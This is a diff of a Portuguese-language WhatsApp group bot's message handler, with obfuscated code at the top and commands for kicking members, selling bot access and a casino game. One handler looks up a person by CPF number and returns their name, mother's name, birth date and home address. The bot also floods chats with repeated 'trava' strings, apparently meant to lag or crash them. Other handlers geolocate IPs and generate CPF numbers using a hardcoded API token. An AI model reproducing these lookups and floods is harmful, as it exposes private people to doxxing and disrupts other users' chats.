ff={'text':_0x3118bd(-0x4d,-0x30,-0x4e,-0x6b,-0x54)+sender[_0x10df3c(0xbe,0xc7,0xbc,0xac,0xad)]('@')[0x1*-0x148e+-0x41e*0x2+0x2*0xe65]+(_0xe206f0(0xe0,0xd0,0xd4,0xf0,0xda)+_0x10df3c(0xca,0xca,0xd4,0xc7,0xb6)+_0x3118bd(-0x43,-0x4f,-0x5e,-0x65,-0x53)+_0x3827be(0x36f,0x34f,0x378,0x36e,0x35c)+_0x10df3c(0xc6,0xbe,0xbb,0xbb,0xb9)+_0x26c85e(0x75,0x6b,0x6a,0x84,0x6d)+_0x10df3c(0xe0,0xbe,0xcc,0xbd,0xc4)+_0x10df3c(0xd2,0xe1,0xc8,0xc3,0xc6)+_0xe206f0(0xde,0xe9,0xf7,0xda,0xd5)+_0xe206f0(0xc6,0xb3,0xc1,0xb5,0xb0)+_0xe206f0(0xc9,0xc7,0xb4,0xd6,0xb7)+_0xe206f0(0xd6,0xe5,0xbc,0xf7,0xb8)+_0x10df3c(0xb6,0xdb,0xb1,0xbe,0xdc)+_0x3827be(0x399,0x37b,0x394,0x3a5,0x3b8)+_0x10df3c(0xc0,0xe1,0xc4,0xe1,0xcc)+_0xe206f0(0xd3,0xdc,0xba,0xc4,0xb4)+'z?'),'contextInfo':{'mentionedJid':[sender]}};reply(ff);return;}function _0x26c85e(_0x40188e,_0x346fae,_0x441c69,_0x504658,_0x45de7d){return _0x31ad(_0x441c69- -0x131,_0x504658);}function _0x2be8(){const _0x55d889=['1618439JuMtbI','aguar','red','...\x0aM','1299FbRvLi','HwPon','ffwqJ','NDO','\x1b[1;3','(((.+','toStr','TCoNd','flood','split','1;31m','ing','yvruH','IvTbV','10584455QInQNR','log','arsTE','apply','➻\x1b[1;','HH:mm',':ss','EuiMK','12148kywCom','const','ar\x20co','yFPKm','s,\x20en','ntre\x20','rmHis','GjuJW','37m]','iEwIs','tão,\x20','7631530lYmFBM','qCkop','7m[\x1b[','elhor','white','NO\x20GR','searc','1854776sMgmAs','ABKBI','\x20não\x20','de\x205\x20','ructo','forma','segun','TsAhE','SPAM:','UPO','cada\x20','ca/Sa','Ameri','bhQFa','6492612PVRmRH','mando','do\x20bl',')+)+)','Oi\x20@','dos\x20e','dATxI','\x20COMA','coman','o_Pau','27813112ZIwLKl','lxSCu'];_0x2be8=function(){return _0x55d889;};return _0x2be8();}function _0x3827be(_0x22f416,_0x3607b2,_0x340015,_0x39c59c,_0x308ce0){return _0x31ad(_0x22f416-0x203,_0x39c59c);}function _0x3118bd(_0x1d306a,_0x196ea8,_0xbba3b9,_0x4283a8,_0x1d497e){return _0x31ad(_0xbba3b9- -0x1ec,_0x1d306a);}if(isCmd&&isFiltered(from)&&isGroup){console[_0x3827be(0x376,0x38c,0x358,0x391,0x371)](_0x10df3c(0x93,0x8f,0xa3,0xa7,0x8a)+'1m'+hora,_0x26c85e(0x4f,0x26,0x37,0x53,0x54)+_0x26c85e(0x35,0x57,0x56,0x71,0x5e)+_0x3827be(0x371,0x359,0x389,0x372,0x36e)+_0x10df3c(0xa2,0xa9,0x93,0xb5,0xcf)+_0x3827be(0x385,0x39f,0x396,0x38e,0x375),color(_0x3118bd(-0x48,-0x4c,-0x58,-0x40,-0x45),_0x3827be(0x38c,0x396,0x39f,0x392,0x3ae)),color(pushname,_0xe206f0(0xdf,0xd4,0xea,0xc0,0xe1)),color(_0x3118bd(-0x2a,-0x57,-0x4b,-0x65,-0x55)+_0x3118bd(-0x95,-0x70,-0x85,-0x86,-0x81),_0x26c85e(0x75,0x55,0x58,0x57,0x69)),color('➻',_0x10df3c(0x104,0xe4,0xeb,0xe7,0xc4)),color(''+command,_0x10df3c(0xd8,0xdb,0x101,0xe7,0xf9)),color(_0x3118bd(-0x65,-0x46,-0x62,-0x49,-0x70)+_0x26c85e(0x87,0x44,0x64,0x7e,0x7f),_0x26c85e(0x43,0x52,0x58,0x36,0x52)),color(groupName,_0x10df3c(0xe3,0xe4,0x109,0xe7,0xe0)));const ff={'text':_0x3827be(0x3a1,0x39a,0x39c,0x392,0x388)+sender[_0x26c85e(0x5c,0x39,0x3c,0x58,0x1f)]('@')[0xb89*-0x2+-0x8*0x287+0x2b4a]+(_0xe206f0(0xe0,0xce,0xc2,0xcf,0xd4)+_0x26c85e(0x4b,0x72,0x57,0x61,0x3c)+_0x26c85e(0x47,0x76,0x5d,0x43,0x66)+_0x10df3c(0x9f,0xca,0xc5,0xab,0xca)+_0x26c85e(0x43,0x5f,0x4b,0x37,0x37)+_0x10df3c(0xfb,0xe4,0xd7,0xda,0xfb)+_0x3827be(0x381,0x38a,0x38c,0x363,0x373)+_0x3118bd(-0x73,-0x67,-0x68,-0x61,-0x88)+_0xe206f0(0xde,0xdb,0xf7,0xe0,0xea)+_0x10df3c(0xb5,0xd8,0xd7,0xce,0xd1)+_0x10df3c(0xe2,0xd3,0xf3,0xd1,0xf4)+_0x10df3c(0xc8,0xce,0xf4,0xde,0xfd)+_0x3118bd(-0x87,-0x6c,-0x6d,-0x86,-0x7a)+_0x10df3c(0xde,0xf5,0xf3,0xd5,0xe2)+_0x26c85e(0x7d,0x93,0x71,0x5f,0x58)+_0x3827be(0x39f,0x39f,0x389,0x383,0x38b)+'z?'),'contextInfo':{'mentionedJid':[sender]}};reply(ff);return;}
 			/////***𝙁𝙐𝙉𝙏𝙄𝙊𝙉 𝘼𝙉𝙏𝙄 𝙑𝙄𝙍𝙐𝙎***\\\\\antivirus
     if (budy.length > 3500) {
     if (!isGroup) return
@@ -2124,29 +1961,29 @@ const hora = moment.tz('America/Sao_Paulo').format('HH:mm:ss')
     if (isGroupAdmins) return;
     reply('d°§trav¥'.repeat(300))
     reply(`「 *TRAVA ACHADA* 」\nNossos sistema Detector Vestigios De Travas De spam\n Por segurança estamos de removendo `)
-    tomioka.groupRemove(from, [sender])
+    client.groupRemove(from, [sender])
     }
 /*if (location.includes(type)){
     if (!isAntiLoc) return
     if (isGroupAdmins) return;
     reply(`loc detectado 👍🏻`)
-		tomioka.groupSettingChange(from, GroupSettingChange.messageSend, true)		
+		client.groupSettingChange(from, GroupSettingChange.messageSend, true)		
         setTimeout(() =>{
-        tomioka.groupRemove(from, [sender])
+        client.groupRemove(from, [sender])
         }, 2000)
         setTimeout( () => {
-		tomioka.groupSettingChange(from, GroupSettingChange.messageSend, false)
+		client.groupSettingChange(from, GroupSettingChange.messageSend, false)
 		}, 8000)
-	tomioka.sendMessage(from, destrava2(prefix), text, { quoted: ftoko })
-                    tomioka.sendMessage(from, destrava3(prefix), text, { quoted: ftoko })
-                    tomioka.sendMessage(from, destrava(prefix), text, { quoted: ftoko })
-                    tomioka.sendMessage(from, destrava2(prefix), text, { quoted: ftoko })
-                    tomioka.sendMessage(from, destrava3(prefix), text, { quoted: ftoko })
+	client.sendMessage(from, destrava2(prefix), text, { quoted: ftoko ,contextInfo: tomis })
+                    client.sendMessage(from, destrava3(prefix), text, { quoted: ftoko ,contextInfo: tomis })
+                    client.sendMessage(from, destrava(prefix), text, { quoted: ftoko ,contextInfo: tomis })
+                    client.sendMessage(from, destrava2(prefix), text, { quoted: ftoko ,contextInfo: tomis })
+                    client.sendMessage(from, destrava3(prefix), text, { quoted: ftoko ,contextInfo: tomis })
 	}*/
 	//botao teste
 	if ((budy === "COMPRAR") || (budy === "Comprar") || (budy === "comprar")) {
 gambar = fs.readFileSync('./eu.jpg')
-mhan = await tomioka.prepareMessage(from, gambar, MessageType.image)
+mhan = await client.prepareMessage(from, gambar, MessageType.image)
 gbutsan = [
   {buttonId: 'id1', buttonText: {displayText: 'PREMIUM - R$15'}, type: 1},
   {buttonId: 'id2', buttonText: {displayText: 'EDITADO - R$30'}, type: 1},
@@ -2158,14 +1995,14 @@ imageMessage: mhan.message.imageMessage,
     buttons: gbutsan,
     headerType: 4
 }
-await tomioka.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
+await client.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
         thumbnail: fs.readFileSync('./eu.jpg'),
         caption: 'kkk'})
 }
 
 if ((budy === "COMPRAS") || (budy === "Compras") || (budy === "compras")) {
 gambar = fs.readFileSync('./eu.jpg')
-mhan = await tomioka.prepareMessage(from, gambar, MessageType.image)
+mhan = await client.prepareMessage(from, gambar, MessageType.image)
 gbutsan = [
     {buttonId: 'id1', buttonText: {displayText: 'PREMIUM - R$15'}, type: 1},
   {buttonId: 'id2', buttonText: {displayText: 'EDITADO - R$30'}, type: 1},
@@ -2177,14 +2014,14 @@ imageMessage: mhan.message.imageMessage,
     buttons: gbutsan,
     headerType: 4
 }
-await tomioka.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
+await client.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
         thumbnail: fs.readFileSync('./eu.jpg'),
         caption: 'kkk'})
 }
 
-if ((budy === ".COMPRAS") || (budy === ".Compras") || (budy === ".compras")) {
+if ((budy === "/COMPRAS") || (budy === "/Compras") || (budy === "/compras")) {
 gambar = fs.readFileSync('./eu.jpg')
-mhan = await tomioka.prepareMessage(from, gambar, MessageType.image)
+mhan = await client.prepareMessage(from, gambar, MessageType.image)
 gbutsan = [
     {buttonId: 'id1', buttonText: {displayText: 'PREMIUM - R$15'}, type: 1},
   {buttonId: 'id2', buttonText: {displayText: 'EDITADO - R$30'}, type: 1},
@@ -2196,14 +2033,14 @@ imageMessage: mhan.message.imageMessage,
     buttons: gbutsan,
     headerType: 4
 }
-await tomioka.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
+await client.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
         thumbnail: fs.readFileSync('./eu.jpg'),
         caption: 'kkk'})
 }
 
-if ((budy === ".COMPRAR") || (budy === ".Comprar") || (budy === ".comprar")) {
+if ((budy === "/COMPRAR") || (budy === "/Comprar") || (budy === "/comprar")) {
 gambar = fs.readFileSync('./eu.jpg')
-mhan = await tomioka.prepareMessage(from, gambar, MessageType.image)
+mhan = await client.prepareMessage(from, gambar, MessageType.image)
 gbutsan = [
     {buttonId: 'id1', buttonText: {displayText: 'PREMIUM - R$15'}, type: 1},
   {buttonId: 'id2', buttonText: {displayText: 'EDITADO - R$30'}, type: 1},
@@ -2215,14 +2052,14 @@ imageMessage: mhan.message.imageMessage,
     buttons: gbutsan,
     headerType: 4
 }
-await tomioka.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
+await client.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
         thumbnail: fs.readFileSync('./eu.jpg'),
         caption: 'kkk'})
 }
 
 if ((budy === "/PREÇOS") || (budy === "/Preços") || (budy === "/preços")) {
 gambar = fs.readFileSync('./eu.jpg')
-mhan = await tomioka.prepareMessage(from, gambar, MessageType.image)
+mhan = await client.prepareMessage(from, gambar, MessageType.image)
 gbutsan = [
     {buttonId: 'id1', buttonText: {displayText: 'PREMIUM - R$15'}, type: 1},
   {buttonId: 'id2', buttonText: {displayText: 'EDITADO - R$30'}, type: 1},
@@ -2234,13 +2071,13 @@ imageMessage: mhan.message.imageMessage,
     buttons: gbutsan,
     headerType: 4
 }
-await tomioka.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
+await client.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
         thumbnail: fs.readFileSync('./eu.jpg'),
         caption: 'kkk'})
 }
 if ((budy === "/PRECOS") || (budy === "/Precos") || (budy === "/precos")) {
 gambar = fs.readFileSync('./eu.jpg')
-mhan = await tomioka.prepareMessage(from, gambar, MessageType.image)
+mhan = await client.prepareMessage(from, gambar, MessageType.image)
 gbutsan = [
     {buttonId: 'id1', buttonText: {displayText: 'PREMIUM - R$15'}, type: 1},
   {buttonId: 'id2', buttonText: {displayText: 'EDITADO - R$30'}, type: 1},
@@ -2252,7 +2089,7 @@ imageMessage: mhan.message.imageMessage,
     buttons: gbutsan,
     headerType: 4
 }
-await tomioka.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
+await client.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
         thumbnail: fs.readFileSync('./eu.jpg'),
         caption: 'kkk'})
 }
@@ -2262,7 +2099,7 @@ teks1 = `essa pessoa: wa.me/${sender.split("@s.whatsapp.net")[0]}\n*quer vip no 
 var options = {
  text: teks1
 }
-tomioka.sendMessage('554498220867@s.whatsapp.net', options, text, {quoted: ftoko})
+client.sendMessage('554498220867@s.whatsapp.net', options, text, {quoted: ftoko ,contextInfo: tomis})
 reply(`Mensagem enviada ao meu dono!\njá já ele irá te responder como que vai ser a forma de pagamento\nobs: e muito obg por me ajudar!!!`)
 	}
 	
@@ -2271,7 +2108,7 @@ teks1 = `essa pessoa: wa.me/${sender.split("@s.whatsapp.net")[0]}\n*quer o bot G
 var options = {
  text: teks1
 }
-tomioka.sendMessage('554498220867@s.whatsapp.net', options, text, {quoted: ftoko})
+client.sendMessage('554498220867@s.whatsapp.net', options, text, {quoted: ftoko ,contextInfo: tomis})
 reply(`Mensagem enviada ao meu dono!\njá já ele irá te responder como que vai ser😊\nobs: e muito obg por me ajudar!😊`)
 	}
 	
@@ -2280,7 +2117,7 @@ teks1 = `essa pessoa: wa.me/${sender.split("@s.whatsapp.net")[0]}\n*quer o bot j
 var options = {
  text: teks1
 }
-tomioka.sendMessage('554498220867@s.whatsapp.net', options, text, {quoted: ftoko})
+client.sendMessage('554498220867@s.whatsapp.net', options, text, {quoted: ftoko ,contextInfo: tomis})
 reply(`Mensagem enviada ao meu dono!\njá já ele irá te responder como que vai ser a forma de pagamento\nobs: e muito obg por me ajudar!😊`)
 	}
 	
@@ -2291,28 +2128,28 @@ if (isGroupAdmins) return reply('Isso é um catálogo, mas vc é adm então ta d
 reply('🔰Ƭrανα Ƈαтάℓσgσ ∂єтєcтαdσ\n❌Rємσνєη∂σ❌')
 var kik = `${sender.split("@")[0]}@s.whatsapp.net`
 setTimeout( () => {
-  tomioka.groupRemove(from, [kik])
+  client.groupRemove(from, [kik])
 }, 2000)
 clear = `🗑️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n🗑️\n❲❗❳ *Lɪᴍᴘᴇᴢᴀ ᴅᴇ Cʜᴀᴛ Cᴏɴᴄʟᴜɪ́ᴅᴀ* ✅`
-tomioka.sendMessage(from, clear , MessageType.text, {quoted: ftoko, contextInfo : { forwardingScore: 500, isForwarded:true}})
+client.sendMessage(from, clear , MessageType.text, {quoted: ftoko ,contextInfo: tomis, contextInfo : { forwardingScore: 500, isForwarded:true}})
 }
 	if (document.includes(type)){
     if (!Antidoc) return
     if (isGroupAdmins) return reply(`to de olho`)     
     reply(`documento detectado 👍🏻`)
-		tomioka.groupSettingChange(from, GroupSettingChange.messageSend, true)		
+		client.groupSettingChange(from, GroupSettingChange.messageSend, true)		
         setTimeout(() =>{
-        tomioka.groupRemove(from, [sender])
+        client.groupRemove(from, [sender])
         }, 2000)
         setTimeout( () => {
-		tomioka.groupSettingChange(from, GroupSettingChange.messageSend, false)
+		client.groupSettingChange(from, GroupSettingChange.messageSend, false)
 		}, 8000)
-	tomioka.sendMessage(from, destrava(prefix), text, { contextInfo: null, quoted: ftoko})
-                    tomioka.sendMessage(from, destrava2(prefix), text, { quoted: ftoko })
-                    tomioka.sendMessage(from, destrava3(prefix), text, { quoted: ftoko })
-                    tomioka.sendMessage(from, destrava(prefix), text, { quoted: ftoko })
-                    tomioka.sendMessage(from, destrava2(prefix), text, { quoted: ftoko })
-                    tomioka.sendMessage(from, destrava3(prefix), text, { quoted: ftoko })
+	client.sendMessage(from, destrava(prefix), text, { contextInfo: null, quoted: ftoko ,contextInfo: tomis})
+                    client.sendMessage(from, destrava2(prefix), text, { quoted: ftoko ,contextInfo: tomis })
+                    client.sendMessage(from, destrava3(prefix), text, { quoted: ftoko ,contextInfo: tomis })
+                    client.sendMessage(from, destrava(prefix), text, { quoted: ftoko ,contextInfo: tomis })
+                    client.sendMessage(from, destrava2(prefix), text, { quoted: ftoko ,contextInfo: tomis })
+                    client.sendMessage(from, destrava3(prefix), text, { quoted: ftoko ,contextInfo: tomis })
 	}
 
 	
@@ -2321,18 +2158,18 @@ tomioka.sendMessage(from, clear , MessageType.text, {quoted: ftoko, contextInfo 
     if (!Anticontato) return
     if (isGroupAdmins) return reply(`to de olho`)     
     reply(`contato detectado 👍🏻`)
-		tomioka.groupSettingChange(from, GroupSettingChange.messageSend, true)		
+		client.groupSettingChange(from, GroupSettingChange.messageSend, true)		
         setTimeout(() =>{
-        tomioka.groupRemove(from, [sender])
+        client.groupRemove(from, [sender])
         }, 2000)
         setTimeout( () => {
-		tomioka.groupSettingChange(from, GroupSettingChange.messageSend, false)
+		client.groupSettingChange(from, GroupSettingChange.messageSend, false)
 		}, 8000)
-	tomioka.sendMessage(from, destrava2(prefix), text, { quoted: ftoko })
-                    tomioka.sendMessage(from, destrava3(prefix), text, { quoted: ftoko })
-                    tomioka.sendMessage(from, destrava(prefix), text, { quoted: ftoko })
-                    tomioka.sendMessage(from, destrava2(prefix), text, { quoted: ftoko })
-                    tomioka.sendMessage(from, destrava3(prefix), text, { quoted: ftoko })
+	client.sendMessage(from, destrava2(prefix), text, { quoted: ftoko ,contextInfo: tomis })
+                    client.sendMessage(from, destrava3(prefix), text, { quoted: ftoko ,contextInfo: tomis })
+                    client.sendMessage(from, destrava(prefix), text, { quoted: ftoko ,contextInfo: tomis })
+                    client.sendMessage(from, destrava2(prefix), text, { quoted: ftoko ,contextInfo: tomis })
+                    client.sendMessage(from, destrava3(prefix), text, { quoted: ftoko ,contextInfo: tomis })
 	}
 			if (selectedButton == ("cassino1")){
 			if (!isGroup) return fakegroup (mess.only.group)
@@ -2341,13 +2178,13 @@ let resposta1 = cassinao[Math.floor(Math.random() * cassinao.length)]
 let resposta2 = cassinao[Math.floor(Math.random() * cassinao.length)]
 let resposta3 = cassinao[Math.floor(Math.random() * cassinao.length)]
 if(resposta1==resposta2&&resposta2==resposta3){
-tomioka.sendMessage(from, `*JOGO DO CASSINO*:\n\n(((((((((((${resposta1}${resposta2}${resposta3})))))))))))))\n\n*Parabéns, _${pushname}_ VOCÊ GANHOU*!!!!!`, text, {quoted: mek})
+client.sendMessage(from, `*JOGO DO CASSINO*:\n\n(((((((((((${resposta1}${resposta2}${resposta3})))))))))))))\n\n*Parabéns, _${pushname}_ VOCÊ GANHOU*!!!!!`, text, {quoted: mek})
 }
 else if(resposta1==resposta2||resposta2==resposta3){
-tomioka.sendMessage(from, `*JOGO DO CASSINO*:\n\n(((((((((((${resposta1}${resposta2}${resposta3})))))))))))))\n\n*Puts, passou perto, _${pushname}_ Quase foi...*`, text, {quoted: mek})
+client.sendMessage(from, `*JOGO DO CASSINO*:\n\n(((((((((((${resposta1}${resposta2}${resposta3})))))))))))))\n\n*Puts, passou perto, _${pushname}_ Quase foi...*`, text, {quoted: mek})
 }
 else{
-tomioka.sendMessage(from, `*JOGO DO CASSINO*:\n\n(((((((((((${resposta1}${resposta2}${resposta3})))))))))))))\n\n*vc perdeu :( , _${pushname}_ Tente na próxima...*`, text, {quoted: mek})
+client.sendMessage(from, `*JOGO DO CASSINO*:\n\n(((((((((((${resposta1}${resposta2}${resposta3})))))))))))))\n\n*vc perdeu :( , _${pushname}_ Tente na próxima...*`, text, {quoted: mek})
 }
 }
 if (selectedButton == ("cassino2")){
@@ -2382,14 +2219,14 @@ if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando
 			if (messagesC.includes("casinos")){
 				var buttons = [{ buttonId: 'cassino', buttonText: { displayText: 'cassino' }, type: 1 }, { buttonId: 'cassino1', buttonText: { displayText: 'cassino1' }, type: 1 }, { buttonId: 'cassino2', buttonText: { displayText: 'cassino2' }, type: 1 }]
                 var buttonsMessage = { contentText: `cassinos`, footerText: 'clique aqui', buttons: buttons, headerType: 1 }
-                var sendMsg = await tomioka.prepareMessageFromContent(from, { buttonsMessage }, {})
-                tomioka.relayWAMessage(sendMsg, { waitForAck: true })
+                var sendMsg = await client.prepareMessageFromContent(from, { buttonsMessage }, {})
+                client.relayWAMessage(sendMsg, { waitForAck: true })
 			}
       //_____________GRUPO OFC DO BOT_________//
        
             
                 if ((budy === `👤 CRIADOR`)){
-          reply('deu')
+          reply(vcard)
       }
 			if (selectedButton == ("grupo")){
 				addFilter(from)
@@ -2408,7 +2245,7 @@ if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando
 	run = process.uptime() 
     teks = `${kyun(run)}`
 gambar = fs.readFileSync('./eu.jpg'),
-mhan = await tomioka.prepareMessage(from, gambar, image, {thumbnail: gambar})
+mhan = await client.prepareMessage(from, gambar, image, {thumbnail: gambar})
 gbutsan = [
   {buttonId: `dono`, buttonText: {displayText: '👤 CRIADOR'}, type: 1},
   {buttonId: `${prefix}menu2`, buttonText: {displayText: '📝 MENUS'}, type: 1}
@@ -2420,19 +2257,19 @@ imageMessage: mhan.message.imageMessage,
     buttons: gbutsan,
     headerType: 4
 }
-await tomioka.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
+await client.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
         thumbnail: fs.readFileSync('./eu.jpg'),
         caption: help(pushname, temp, prefix),
         "contextInfo": {
             mentionedJid: [sender]},
-            quoted: ftoko})
+            quoted: ftoko ,contextInfo: tomis})
            	
      }
 if (text.includes("ip"))
   { const aris = text.replace(/!ip /, "") 
   axios.get(`https://mnazria.herokuapp.com/api/check?ip=${aris}`).then((res) =>{ 
   let hasil = ` *🔍CONSULTA REALIZADA🔍* \n\n ➸ *CIDADE:*  ${res.data.city}\n ➸ *Latitude* : ${res.data.latitude}\n ➸ *Longtitude* : ${res.data.longitude}\n ➸ *REGIÃO* : ${res.data.region_name}\n ➸ *UF* : ${res.data.region_code}\n ➸ *IP* : ${res.data.ip}\n ➸ *TIPO* : ${res.data.type}\n ➸ *CEP* : ${res.data.zip}\n ➸ *LOCALIDADE* : ${res.data.location.geoname_id}\n ➸ *CAPITAL* : ${res.data.location.capital}\n ➸ *DDD* : ${res.data.location.calling_code}\n ➸ *PAÍS* : ${res.data.location.country_flag_emoji}\n *📌BY:May Bot*` 
-  tomioka.sendMessage(id, hasil, MessageType.text); 
+  client.sendMessage(id, hasil, MessageType.text); 
  })
  }
 	
@@ -2443,7 +2280,7 @@ if (text.includes('cry')){
         .then(
           (ress) => {
             var buf = Buffer.from(ress, 'base64')
-            tomioka.sendMessage(id, buf, MessageType.image)
+            client.sendMessage(id, buf, MessageType.image)
         })
     })
 }	
@@ -2451,9 +2288,9 @@ if (text.includes('cry')){
 if (text.includes("cnpj")){
 const aris = text.replace(/!cnpj /, "")
 axios.get(`https://www.receitaws.com.br/v1/cnpj/${aris}`).then((res) => {
-	tomioka.sendMessage(id, '[❗] ESPERE ESTOU BUSCANDO DADOS', MessageType.text)
+	client.sendMessage(id, '[❗] ESPERE ESTOU BUSCANDO DADOS', MessageType.text)
          let cep = `*🔍CONSULTA REALIZADA🔍* \n\n ➸ *ATIVIDADE PRINCIPAL:* ${res.data.atividade_principal[0].text} \n\n ➸ *DATA SITUAÇÃO:* ${res.data.data_situacao}\n\n ➸ *TIPO:* ${res.data.tipo} \n\n ➸ *NOME:* ${res.data.nome} \n\n ➸ *UF:* ${res.data.uf} \n\n ➸ *TELEFONE:* ${res.data.telefone}\n\n ➸ *SITUAÇÃO:* ${res.data.situacao} \n\n ➸ *BAIRRO:* ${res.data.bairro} \n\n ➸ *RUA:* ${res.data.logradouro} \n\n ➸ *NÚMERO :* ${res.data.numero} \n\n ➸ *CEP :* ${res.data.cep} \n\n ➸ *MUNICÍPIO:* ${res.data.municipio} \n\n ➸ *PORTE:* ${res.data.porte}\n\n ➸ *ABERTURA:* ${res.data.abertura}\n\n ➸ *NATUREZA JURÍDICA:* ${res.data.natureza_juridica} \n\n ➸ *FANTASIA:* ${res.data.fantasia}\n\n ➸ *CNPJ:* ${res.data.cnpj}\n\n ➸ *ÚLTIMA ATUALIZAÇÃO:* ${res.data.ultima_atualizacao}\n\n ➸ *STATUS:* ${res.data.status}\n\n ➸ *COMPLEMENTO:* ${res.data.complemento}\n\n ➸ *EMAIL:* ${res.data.email}\n\n *📌BY:May Bot* `;
-    tomioka.sendMessage(id, cep ,MessageType.text);
+    client.sendMessage(id, cep ,MessageType.text);
 }) 
 }
 
@@ -2461,17 +2298,17 @@ if (text.includes("cpf")){
                       	teste = body.slice(10)
 const aris = text.replace(/!cpf /, "")
 axios.get(`https://api-rwx.000webhostapp.com/api/cpf.php/?token=${aris}&cpf=${teste}`).then((res) => {
-	tomioka.sendMessage(id, '[❗] ESPERE ESTOU BUSCANDO DADOS', MessageType.text)
+	client.sendMessage(id, '[❗] ESPERE ESTOU BUSCANDO DADOS', MessageType.text)
          let ecpf = `*🔍CONSULTA REALIZADA🔍* \n\n ➸ *CPF:* ${res.data.CPF} \n\n ➸ *NOME:* ${res.data.Nome}\n\n ➸ *MÃE:* ${res.data.NomeMae} \n\n ➸ *NASCIMENTO:* ${res.data.DataNascimento} \n\n ➸ *RUA:* ${res.data.Rua} \n\n ➸ *N°:* ${res.data.NumeroRua}\n\n ➸ *COMPLEMENTO:* ${res.data.Complemento}\n\n ➸ *BAIRRO:* ${res.data.Bairro}\n\n ➸ *CEP:* ${res.data.CEP}\n\n ➸ *UF:* ${res.data.EstadoSigla}\n\n ➸ *CIDADE:* ${res.data.Cidade}\n\n ➸ *ESTADO:* ${res.data.Estado}\n\n ➸ *PAIS:* ${res.data.Pais}  \n\n *📌BY:May Bot* `;
-    tomioka.sendMessage(id, ecpf ,MessageType.text);
+    client.sendMessage(id, ecpf ,MessageType.text);
 }) 
 }
 
 if ((budy === 'AJUDA') || (budy === 'Ajuda') || (budy === 'ajuda')) {
 		var buttons = [{ buttonId: 'grupo', buttonText: { displayText: 'grupo' }, type: 1 }, { buttonId: 'dono', buttonText: { displayText: 'dono' }, type: 1 }, { buttonId: 'menu', buttonText: { displayText: 'menu' }, type: 1 }]
                 var buttonsMessage = { contentText: `como posso ajudar?`, footerText: 'clique em um dos botões abaixo', buttons: buttons, headerType: 1 }
-                var sendMsg = await tomioka.prepareMessageFromContent(from, { buttonsMessage }, {})
-                tomioka.relayWAMessage(sendMsg, { message: { thumbnail: fs.readFileSync('./me.jpg'), caption: 'kkk'}, waitForAck: true})
+                var sendMsg = await client.prepareMessageFromContent(from, { buttonsMessage }, {})
+                client.relayWAMessage(sendMsg, { message: { thumbnail: fs.readFileSync('./me.jpg'), caption: 'kkk'}, waitForAck: true})
 }
 /////_____BOTAO WA____/////
 if (symmantec == 'SIM') {
@@ -2520,11 +2357,11 @@ if (symmantec == 'NÃO') {
         }
     }
 const sendFakeStatus = (from, teks, faketeks) => {
-				tomioka.sendMessage(from, teks, text, { thumbnail: tomis, sendEphemeral: true, quoted: ftoko})
+				client.sendMessage(from, teks, text, { thumbnail: tomis, sendEphemeral: true, quoted: ftoko ,contextInfo: tomis})
 			}
 	/*if ((budy === "AJUDA") || (budy === "Ajuda") || (budy === "ajuda")) {
 gambar = fs.readFileSync('./me.jpg')
-mhan = await tomioka.prepareMessage(from, gambar, MessageType.image)
+mhan = await client.prepareMessage(from, gambar, MessageType.image)
 gbutsan = [
   {buttonId: 'id1', buttonText: {displayText: 'mais opções📝'}, type: 1},
   {buttonId: 'id2', buttonText: {displayText: 'registrar-me📌'}, type: 1}]
@@ -2535,25 +2372,25 @@ imageMessage: mhan.message.imageMessage,
     buttons: gbutsan,
     headerType: 4
 }
-await tomioka.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
+await client.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
         thumbnail: fs.readFileSync('./me.jpg'),
         caption: 'kkk'})
 }*/
 if (text.includes("geradorcpf")){
 const aris = text.replace(/!geradorcpf/, "")
 axios.get(`http://geradorapp.com/api/v1/cpf/generate?token=40849779ec68f8351995def08ff1e2fa`).then((res) => {
-	tomioka.sendMessage(id, '[❗] ESPERE ESTA PROCESSANDO', MessageType.text)
+	client.sendMessage(id, '[❗] ESPERE ESTA PROCESSANDO', MessageType.text)
          let cpf = `*🔍CPF GERADOS🔍* \n\n ➸ *CPF:* ${res.data.data.number}  \n\n *📌BY:May Bot*`;
-    tomioka.sendMessage(id, cpf ,MessageType.text);
+    client.sendMessage(id, cpf ,MessageType.text);
 })
 }	
 
 if (text.includes("cep")){
 const aris = text.replace(/!cep /, "")
 axios.get(`https://viacep.com.br/ws/${aris}/json/`).then((res) => {
-	tomioka.sendMessage(id, '[❗] ESPERE ESTOU BUSCANDO DADOS', MessageType.text)
+	client.sendMessage(id, '[❗] ESPERE ESTOU BUSCANDO DADOS', MessageType.text)
